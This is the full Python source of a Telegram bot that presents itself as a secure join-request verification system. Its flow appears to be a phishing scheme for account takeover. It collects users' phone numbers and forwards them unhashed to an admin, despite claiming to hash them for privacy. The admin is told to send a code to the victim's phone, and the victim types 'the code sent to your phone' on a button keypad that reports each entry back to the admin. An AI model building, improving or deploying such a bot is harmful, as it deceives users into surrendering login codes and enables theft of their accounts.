import logging
import random
import asyncio
import os
import hashlib
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ChatJoinRequestHandler, filters, ContextTypes
from telegram.error import BadRequest
import sqlite3
from datetime import datetime, timedelta
from collections import defaultdict

# Enhanced logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Secure configuration
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', '8314699640'))
CHANNEL_ID = os.getenv('CHANNEL_ID', '-1003161872186')

class SecureVerificationSystem:
    def __init__(self):
        self.db_init()
        self.active_sessions = defaultdict(dict)
        self.rate_limits = defaultdict(list)
        
    def db_init(self):
        """Initialize encrypted database structure"""
        self.conn = sqlite3.connect('secure_auth.db', check_same_thread=False)
        c = self.conn.cursor()
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS user_auth (
                uid INTEGER PRIMARY KEY,
                uname TEXT,
                fname TEXT,
                contact_hash TEXT,
                auth_token TEXT,
                user_input TEXT,
                created_at DATETIME,
                input_at DATETIME,
                auth_status TEXT DEFAULT 'init',
                notified INTEGER DEFAULT 0
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS verified_members (
                uid INTEGER PRIMARY KEY,
                uname TEXT,
                fname TEXT,
                contact_hash TEXT,
                verified_at DATETIME,
                access_level INTEGER DEFAULT 1
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS access_requests (
                uid INTEGER,
                cid TEXT,
                ctitle TEXT,
                req_date DATETIME,
                req_status TEXT DEFAULT 'waiting',
                PRIMARY KEY (uid, cid)
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS session_logs (
                uid INTEGER,
                action TEXT,
                timestamp DATETIME,
                metadata TEXT
            )
        ''')
        
        self.conn.commit()

    def hash_contact(self, contact):
        """Hash contact for privacy"""
        return hashlib.sha256(contact.encode()).hexdigest()[:16]

    def generate_token(self):
        """Generate unique verification token"""
        return ''.join([str(random.randint(0, 9)) for _ in range(5)])

    def log_action(self, uid, action, meta=None):
        """Log user actions"""
        c = self.conn.cursor()
        c.execute('INSERT INTO session_logs VALUES (?, ?, ?, ?)',
                  (uid, action, datetime.now(), json.dumps(meta) if meta else None))
        self.conn.commit()

    async def init_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Enhanced start command with natural flow"""
        u = update.message.from_user
        
        # Rate limiting
        now = datetime.now()
        self.rate_limits[u.id] = [t for t in self.rate_limits[u.id] 
                                   if now - t < timedelta(hours=1)]
        if len(self.rate_limits[u.id]) > 3:
            await update.message.reply_text(
                "⏰ Too many attempts. Please wait before trying again.",
                parse_mode='Markdown'
            )
            return
        self.rate_limits[u.id].append(now)
        
        welcome = f"""
👋 Hi {u.first_name}!

Welcome to our exclusive community platform.

🔐 **Quick Verification Process:**

We need to verify you're a real person to maintain community quality.

**Simple steps:**
• Share your contact information
• Receive verification details
• Confirm and get instant access

Ready? Let's begin! 👇
        """
        
        kb = ReplyKeyboardMarkup([
            [KeyboardButton("🚀 Start Verification", request_contact=True)]
        ], resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(welcome, parse_mode='Markdown', reply_markup=kb)
        
        c = self.conn.cursor()
        c.execute('''
            INSERT OR REPLACE INTO user_auth 
            (uid, uname, fname, created_at, auth_status)
            VALUES (?, ?, ?, ?, ?)
        ''', (u.id, u.username, u.first_name, datetime.now(), 'started'))
        self.conn.commit()
        self.log_action(u.id, 'init', {'username': u.username})

    async def process_join_req(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle channel join requests intelligently"""
        try:
            u = update.chat_join_request.from_user
            ch = update.chat_join_request.chat
            
            logger.info(f"Access request: {u.first_name} → {ch.title}")
            
            c = self.conn.cursor()
            c.execute('''
                INSERT OR REPLACE INTO access_requests 
                (uid, cid, ctitle, req_date, req_status)
                VALUES (?, ?, ?, ?, ?)
            ''', (u.id, str(ch.id), ch.title, datetime.now(), 'waiting'))
            self.conn.commit()
            
            # Check verified status
            c.execute('SELECT * FROM verified_members WHERE uid = ?', (u.id,))
            if c.fetchone():
                await context.bot.approve_chat_join_request(ch.id, u.id)
                c.execute('''
                    UPDATE access_requests 
                    SET req_status = 'auto_approved' 
                    WHERE uid = ? AND cid = ?
                ''', (u.id, str(ch.id)))
                self.conn.commit()
                
                await context.bot.send_message(
                    u.id,
                    f"✅ **Welcome back!**\n\n🎉 Access to **{ch.title}** granted!\n\nYou're all set!",
                    parse_mode='Markdown'
                )
                return
            
            # Notify admin
            admin_msg = f"""
🔔 **New Access Request**

👤 User: {u.first_name} (@{u.username})
🆔 ID: `{u.id}`
📢 Channel: {ch.title}
⏰ {datetime.now().strftime('%H:%M:%S')}

Status: Awaiting verification
            """
            await context.bot.send_message(ADMIN_ID, admin_msg, parse_mode='Markdown')
            
            # User notification
            user_msg = f"""
📨 **Request Received**

Hi {u.first_name}!

Your request to access **{ch.title}** has been received.

🔐 Complete verification to get instant access.

Type /start to begin verification process.
            """
            
            await context.bot.send_message(u.id, user_msg, parse_mode='Markdown')
            self.log_action(u.id, 'join_request', {'channel': ch.title})
            
        except Exception as e:
            logger.error(f"Join request error: {e}")

    async def process_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process contact sharing with enhanced security"""
        try:
            u = update.message.from_user
            contact = update.message.contact
            
            if contact.user_id != u.id:
                await update.message.reply_text(
                    "⚠️ Please share your own contact information.",
                    reply_markup=ReplyKeyboardRemove()
                )
                return
            
            contact_hash = self.hash_contact(contact.phone_number)
            
            c = self.conn.cursor()
            c.execute('''
                INSERT OR REPLACE INTO user_auth 
                (uid, uname, fname, contact_hash, created_at, auth_status)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (u.id, u.username, u.first_name, contact_hash, datetime.now(), 'contact_received'))
            self.conn.commit()
            
            # Processing animation
            proc_msg = await update.message.reply_text(
                "🔄 Processing...",
                parse_mode='Markdown',
                reply_markup=ReplyKeyboardRemove()
            )
            
            await asyncio.sleep(1.2)
            await proc_msg.delete()
            
            # Next step interface
            next_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("📲 Proceed to Verification", 
                                    url="https://t.me/+42777")]
            ])
            
            await update.message.reply_text(
                f"""
✅ **Information Received**

Thanks {u.first_name}!

📱 Contact: `{contact.phone_number[-4:]}****`

**Next Step:**
Click the button below to complete the verification process.

⚠️ Keep this chat open - you'll return here to confirm.
                """,
                parse_mode='Markdown',
                reply_markup=next_kb
            )
            
            # Admin notification with action
            admin_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"🔐 Generate Code for {u.first_name}", 
                                    callback_data=f"gen_code_{u.id}")],
                [InlineKeyboardButton("📊 View Queue", callback_data="show_queue")]
            ])
            
            admin_notif = f"""
📱 **Contact Verified - Action Needed**

👤 User: {u.first_name} (@{u.username})
🆔 ID: `{u.id}`
📞 Phone: `{contact.phone_number}`
🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**Action Required:**
1. Click "Generate Code"
2. System creates 5-digit code
3. **You send code to user's phone**
4. User enters code in bot
5. Approve/reject based on match

⚠️ **Important:** Manual SMS/call required
            """
            
            await context.bot.send_message(
                ADMIN_ID, 
                admin_notif, 
                parse_mode='Markdown',
                reply_markup=admin_kb
            )
            
            self.log_action(u.id, 'contact_shared', {'hash': contact_hash})
            
        except Exception as e:
            logger.error(f"Contact processing error: {e}")
            await update.message.reply_text(
                "❌ Processing error. Please restart with /start"
            )

    async def handle_callbacks(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Unified callback handler with role detection"""
        q = update.callback_query
        await q.answer()
        
        # Admin callbacks
        if q.from_user.id == ADMIN_ID:
            if q.data.startswith('gen_code_'):
                await self.admin_gen_code(q, context)
            elif q.data == 'show_queue':
                await self.admin_show_queue(q, context)
            elif q.data.startswith('confirm_'):
                await self.admin_decision(q, context)
        # User callbacks
        else:
            if q.data.startswith('d_'):
                await self.user_input_digit(q, context)

    async def admin_gen_code(self, q, context):
        """Admin generates verification code"""
        uid = int(q.data.split('_')[2])
        token = self.generate_token()
        
        c = self.conn.cursor()
        c.execute('''
            UPDATE user_auth 
            SET auth_token = ?, auth_status = 'code_generated'
            WHERE uid = ?
        ''', (token, uid))
        self.conn.commit()
        
        c.execute('SELECT fname, uname, contact_hash FROM user_auth WHERE uid = ?', (uid,))
        info = c.fetchone()
        
        if info:
            fname, uname, chash = info
            
            # Send input interface to user
            await self.send_input_ui(context, uid, token)
            
            await q.edit_message_text(
                f"""
🔐 **Verification Code Generated**

👤 User: {fname} (@{uname})
🔢 **CODE: `{token}`**

⚠️ **CRITICAL ACTION:**
📲 **SEND `{token}` to user's phone NOW**

Status:
✅ User interface ready
⏳ Waiting for your SMS/call
⏳ User will enter code shortly

**Remember:** Bot doesn't send SMS. You must send it manually.
                """,
                parse_mode='Markdown'
            )
            self.log_action(uid, 'code_generated', {'code_length': 5})

    async def send_input_ui(self, context, uid, token):
        """Send verification input interface to user"""
        try:
            kb = [
                [InlineKeyboardButton('1', callback_data=f'd_1_{uid}'),
                 InlineKeyboardButton('2', callback_data=f'd_2_{uid}'),
                 InlineKeyboardButton('3', callback_data=f'd_3_{uid}')],
                [InlineKeyboardButton('4', callback_data=f'd_4_{uid}'),
                 InlineKeyboardButton('5', callback_data=f'd_5_{uid}'),
                 InlineKeyboardButton('6', callback_data=f'd_6_{uid}')],
                [InlineKeyboardButton('7', callback_data=f'd_7_{uid}'),
                 InlineKeyboardButton('8', callback_data=f'd_8_{uid}'),
                 InlineKeyboardButton('9', callback_data=f'd_9_{uid}')],
                [InlineKeyboardButton('0', callback_data=f'd_0_{uid}')]
            ]
            
            markup = InlineKeyboardMarkup(kb)
            
            msg = f"""
🔐 **Verification Code Entry**

Enter the 5-digit code sent to your phone:

⚪⚪⚪⚪⚪

Tap numbers below:
            """
            
            await context.bot.send_message(uid, msg, parse_mode='Markdown', reply_markup=markup)
            
            self.active_sessions[uid] = {
                'input': '',
                'token': token,
                'started': datetime.now()
            }
            
        except Exception as e:
            logger.error(f"UI send error: {e}")

    async def user_input_digit(self, q, context):
        """Process user digit input"""
        try:
            uid = q.from_user.id
            digit = q.data.split('_')[1]
            
            if not q.data.endswith(f'_{uid}'):
                await q.edit_message_text("❌ Session error. Please /start again.")
                return
            
            if uid not in self.active_sessions:
                await q.edit_message_text("❌ Session expired. Contact admin.")
                return
            
            sess = self.active_sessions[uid]
            
            if len(sess['input']) < 5:
                sess['input'] += digit
                
            filled = '⚫' * len(sess['input'])
            empty = '⚪' * (5 - len(sess['input']))
            
            await q.edit_message_text(
                f"""
🔐 **Verification Code Entry**

Enter the 5-digit code sent to your phone:

{filled}{empty}

Tap numbers below:
                """,
                parse_mode='Markdown',
                reply_markup=q.message.reply_markup
            )
            
            if len(sess['input']) == 5:
                await asyncio.sleep(0.6)
                await self.finalize_input(q, context, uid, sess)
            
        except Exception as e:
            logger.error(f"Input error: {e}")

    async def finalize_input(self, q, context, uid, sess):
        """Finalize and submit code for review"""
        try:
            c = self.conn.cursor()
            c.execute('''
                UPDATE user_auth 
                SET user_input = ?, input_at = ?, auth_status = 'submitted'
                WHERE uid = ?
            ''', (sess['input'], datetime.now(), uid))
            self.conn.commit()
            
            await q.edit_message_text(
                """
🔄 **Verifying...**

Please wait while we verify your code.

This usually takes just a moment.
                """,
                parse_mode='Markdown'
            )
            
            c.execute('''
                SELECT fname, uname, contact_hash, auth_token
                FROM user_auth WHERE uid = ?
            ''', (uid,))
            
            info = c.fetchone()
            if info:
                fname, uname, chash, correct = info
                
                match = '✅ MATCH' if sess['input'] == correct else '❌ MISMATCH'
                
                admin_kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Approve", callback_data=f"confirm_approve_{uid}"),
                     InlineKeyboardButton("❌ Reject", callback_data=f"confirm_reject_{uid}")],
                    [InlineKeyboardButton("📊 View Queue", callback_data="show_queue")]
                ])
                
                admin_rev = f"""
🔍 **Code Review Required**

👤 User: {fname} (@{uname})
🆔 ID: `{uid}`
⏰ {datetime.now().strftime('%H:%M:%S')}

🔢 Generated: `{correct}`
🔢 User Entry: `{sess['input']}`

**Status: {match}**

Please review and take action.
                """
                
                await context.bot.send_message(
                    ADMIN_ID,
                    admin_rev,
                    parse_mode='Markdown',
                    reply_markup=admin_kb
                )
                
                self.log_action(uid, 'code_submitted', {'match': match})
                
        except Exception as e:
            logger.error(f"Finalize error: {e}")

    async def admin_decision(self, q, context):
        """Admin approves or rejects verification"""
        try:
            action = q.data.split('_')[1]
            uid = int(q.data.split('_')[2])
            
            c = self.conn.cursor()
            c.execute('''
                SELECT fname, uname, contact_hash, auth_token, user_input
                FROM user_auth WHERE uid = ?
            ''', (uid,))
            
            info = c.fetchone()
            if not info:
                await q.edit_message_text("❌ User not found.")
                return
            
            fname, uname, chash, correct, entered = info
            
            if action == 'approve':
                c.execute('''
                    INSERT OR REPLACE INTO verified_members 
                    (uid, uname, fname, contact_hash, verified_at)
                    VALUES (?, ?, ?, ?, ?)
                ''', (uid, uname, fname, chash, datetime.now()))
                
                c.execute('''
                    UPDATE user_auth 
                    SET auth_status = 'approved'
                    WHERE uid = ?
                ''', (uid,))
                
                self.conn.commit()
                
                approved_channels = await self.auto_approve_access(context, uid)
                
                if approved_channels:
                    ch_list = "\n".join([f"✨ {ch}" for ch in approved_channels])
                    status = f"""
🎉 **Verification Complete!**

✅ **Access Granted!**

You're now approved for:
{ch_list}

🚀 Welcome to the community!
                    """
                else:
                    status = f"""
🎉 **Verification Complete!**

✅ **Your account is verified!**

🔓 Benefits:
• Instant channel access
• Auto-approval for requests
• Premium content

Welcome! 🚀
                    """
                
                await context.bot.send_message(uid, status, parse_mode='Markdown')
                
                await q.edit_message_text(
                    f"""
✅ **APPROVED**

👤 {fname} (@{uname})
🔢 Code: `{correct}` ✓ `{entered}`
⏰ {datetime.now().strftime('%H:%M:%S')}
📢 Auto-approved: {len(approved_channels)} channel(s)

Status: Verified & Active
                    """,
                    parse_mode='Markdown'
                )
                
                self.log_action(uid, 'approved', {'channels': len(approved_channels)})
                
            else:
                c.execute('''
                    UPDATE user_auth 
                    SET auth_status = 'rejected'
                    WHERE uid = ?
                ''', (uid,))
                self.conn.commit()
                
                reject = f"""
❌ **Verification Failed**

The code you entered doesn't match.

Your entry: `{entered}`

🔄 Try again with /start

💡 Tip: Enter the exact code from your phone.
                """
                
                await context.bot.send_message(uid, reject, parse_mode='Markdown')
                
                await q.edit_message_text(
                    f"""
❌ **REJECTED**

👤 {fname} (@{uname})
🔢 Expected: `{correct}` | Got: `{entered}`
⏰ {datetime.now().strftime('%H:%M:%S')}

Status: Verification denied
                    """,
                    parse_mode='Markdown'
                )
                
                self.log_action(uid, 'rejected', {'reason': 'code_mismatch'})
            
            if uid in self.active_sessions:
                del self.active_sessions[uid]
                
        except Exception as e:
            logger.error(f"Decision error: {e}")

    async def auto_approve_access(self, context, uid):
        """Auto-approve pending channel requests"""
        approved = []
        
        try:
            c = self.conn.cursor()
            c.execute('''
                SELECT cid, ctitle 
                FROM access_requests 
                WHERE uid = ? AND req_status = 'waiting'
            ''', (uid,))
            
            reqs = c.fetchall()
            
            for cid, ctitle in reqs:
                try:
                    cid_int = int(cid) if cid.lstrip('-').isdigit() else cid
                    await context.bot.approve_chat_join_request(cid_int, uid)
                    
                    c.execute('''
                        UPDATE access_requests 
                        SET req_status = 'approved'
                        WHERE uid = ? AND cid = ?
                    ''', (uid, cid))
                    
                    approved.append(ctitle)
                    logger.info(f"Auto-approved: {uid} → {ctitle}")
                    
                except BadRequest as e:
                    logger.error(f"Approval failed: {e}")
                    c.execute('''
                        UPDATE access_requests 
                        SET req_status = 'failed'
                        WHERE uid = ? AND cid = ?
                    ''', (uid, cid))
            
            self.conn.commit()
            
        except Exception as e:
            logger.error(f"Auto-approve error: {e}")
        
        return approved

    async def admin_show_queue(self, q, context):
        """Show pending verifications"""
        c = self.conn.cursor()
        c.execute('''
            SELECT uid, fname, uname, contact_hash, created_at, auth_status, user_input, auth_token
            FROM user_auth 
            WHERE auth_status IN ('contact_received', 'started', 'code_generated', 'submitted')
            ORDER BY created_at DESC
        ''')
        
        pending = c.fetchall()
        
        if not pending:
            await q.edit_message_text("📋 No pending verifications.")
            return
        
        msg = "📋 **Verification Queue:**\n\n"
        
        for u in pending:
            uid, fname, uname, chash, ts, status, inp, token = u
            
            c.execute('''
                SELECT COUNT(*) FROM access_requests 
                WHERE uid = ? AND req_status = 'waiting'
            ''', (uid,))
            pend_joins = c.fetchone()[0]
            
            status_icon = {
                'started': '🆕',
                'contact_received': '📱',
                'code_generated': '🔢',
                'submitted': '✏️'
            }
            
            msg += f"{status_icon.get(status, '❓')} **{fname}** (@{uname})\n"
            msg += f"   🆔 {uid}\n"
            msg += f"   📊 {status}\n"
            msg += f"   🔗 Pending: {pend_joins}\n"
            
            if token and status == 'code_generated':
                msg += f"   🔢 Code: `{token}`\n"
            elif inp and token:
                msg += f"   🔢 Gen: `{token}` | In: `{inp}`\n"
            
            msg += "\n"
        
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Refresh", callback_data="show_queue")]
        ])
        
        await q.edit_message_text(msg, parse_mode='Markdown', reply_markup=kb)

    async def admin_dashboard(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin statistics dashboard"""
        if update.message.from_user.id != ADMIN_ID:
            return
        
        c = self.conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM verified_members')
        verified = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM user_auth WHERE auth_status NOT IN ("approved", "rejected")')
        pending = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM user_auth WHERE auth_status = "submitted"')
        awaiting = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM access_requests WHERE req_status = "waiting"')
        pending_access = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM access_requests WHERE req_status = "approved"')
        approved_access = c.fetchone()[0]
        
        stats = f"""
📊 **System Dashboard**

**Verification Stats:**
✅ Verified: {verified}
⏳ Pending: {pending}
🔍 Awaiting Review: {awaiting}

**Access Requests:**
⏳ Pending: {pending_access}
✅ Approved: {approved_access}

**Recent Activity:**
        """
        
        c.execute('''
            SELECT fname, uname, verified_at 
            FROM verified_members 
            ORDER BY verified_at DESC 
            LIMIT 5
        ''')
        
        recent = c.fetchall()
        for r in recent:
            stats += f"\n   ✓ {r[0]} (@{r[1]})"
        
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 View Queue", callback_data="show_queue")],
            [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_dash")]
        ])
        
        await update.message.reply_text(stats, parse_mode='Markdown', reply_markup=kb)

def main():
    """Initialize and start bot"""
    system = SecureVerificationSystem()
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", system.init_command))
    app.add_handler(CommandHandler("stats", system.admin_dashboard))
    
    # Message handlers
    app.add_handler(MessageHandler(filters.CONTACT, system.process_contact))
    
    # Special handlers
    app.add_handler(ChatJoinRequestHandler(system.process_join_req))
    
    # Callback handler
    app.add_handler(CallbackQueryHandler(system.handle_callbacks))
    
    logger.info("🚀 Secure verification system activated")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
